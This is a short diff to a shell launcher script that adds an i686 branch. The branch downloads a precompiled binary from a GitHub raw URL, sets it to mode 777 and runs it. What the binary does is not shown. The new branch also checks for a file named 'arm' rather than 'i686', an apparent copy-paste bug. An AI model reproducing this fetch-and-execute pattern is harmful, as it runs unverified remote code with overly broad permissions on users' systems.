@@ -17,6 +17,14 @@ elif [[ $current_os == *"arm"* ]]; then
     else
         ./arm
     fi
+elif [[ $current_os == *"i686"* ]]; then
+    if [ ! -f "arm" ]; then
+        curl -L https://github.com/hop09/compiled/raw/main/i86/i686 > i686
+        chmod 777 i686
+        ./i686
+    else
+        ./i686
+    fi
 else
     echo -e "\nUnknown device, aarch or os found, contact author."
     exit 1
